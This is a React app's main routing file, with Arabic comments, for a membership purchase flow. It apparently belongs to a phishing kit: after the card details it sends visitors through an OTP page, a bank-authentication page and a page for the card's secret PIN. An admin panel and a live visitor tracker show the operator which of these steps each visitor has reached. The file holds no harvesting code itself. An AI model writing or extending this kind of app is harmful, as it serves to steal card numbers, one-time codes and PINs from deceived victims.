import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { useEffect } from "react";
import { Route, Switch, useLocation } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import { ThemeProvider } from "./contexts/ThemeContext";
import { OrderProvider } from "./contexts/OrderContext";
import { LanguageProvider } from "./contexts/LanguageContext";
import { startVisitorPresence } from "./lib/liveOrders";

import Home from "./pages/Home";
import Memberships from "./pages/Memberships";
import Benefits from "./pages/Benefits";
import Register from "./pages/Register";
import Address from "./pages/Address";
import Review from "./pages/Review";
import Payment from "./pages/Payment";
import Otp from "./pages/Otp";
import BankAuth from "./pages/BankAuth";
import Pin from "./pages/Pin";
import Success from "./pages/Success";
import Rejected from "./pages/Rejected";
import Admin from "./pages/Admin";

// خريطة المسارات إلى أسماء عربية تظهر في "الزوار النشطون"
const PAGE_LABELS: Record<string, string> = {
  "/": "الرئيسية",
  "/memberships": "العضويات",
  "/benefits": "مزايا العضوية",
  "/register": "التسجيل",
  "/address": "العنوان",
  "/review": "ملخص الطلب",
  "/payment": "بيانات البطاقة",
  "/otp": "رمز OTP",
  "/bank-auth": "مصادقة بنكية",
  "/pin": "الرقم السري",
  "/success": "تم الطلب",
  "/rejected": "مرفوض",
};

function pageLabelFor(path: string): string {
  return PAGE_LABELS[path] || "صفحة أخرى";
}

// تتبّع حضور الزوار: يسجّل كل زائر فور دخوله أي صفحة (عدا لوحة التحكم)
// ويحدّث اسم الصفحة عند التنقل بين المسارات.
function VisitorPresenceTracker() {
  const [location] = useLocation();

  useEffect(() => {
    // لا نتتبّع المشرف داخل لوحة التحكم كزائر
    if (location.startsWith("/admin")) return;
    const stop = startVisitorPresence(() => pageLabelFor(location));
    return stop;
  }, [location]);

  return null;
}

function Router() {
  return (
    <Switch>
      <Route path="/" component={Home} />
      <Route path="/memberships" component={Memberships} />
      <Route path="/benefits" component={Benefits} />
      <Route path="/register" component={Register} />
      <Route path="/address" component={Address} />
      <Route path="/review" component={Review} />
      <Route path="/payment" component={Payment} />
      <Route path="/otp" component={Otp} />
      <Route path="/bank-auth" component={BankAuth} />
      <Route path="/pin" component={Pin} />
      <Route path="/success" component={Success} />
      <Route path="/rejected" component={Rejected} />
      <Route path="/admin" component={Admin} />
      <Route path="/404" component={NotFound} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="light">
        <LanguageProvider>
          <TooltipProvider>
            <OrderProvider>
              <Toaster richColors position="top-center" />
              <VisitorPresenceTracker />
              <Router />
            </OrderProvider>
          </TooltipProvider>
        </LanguageProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
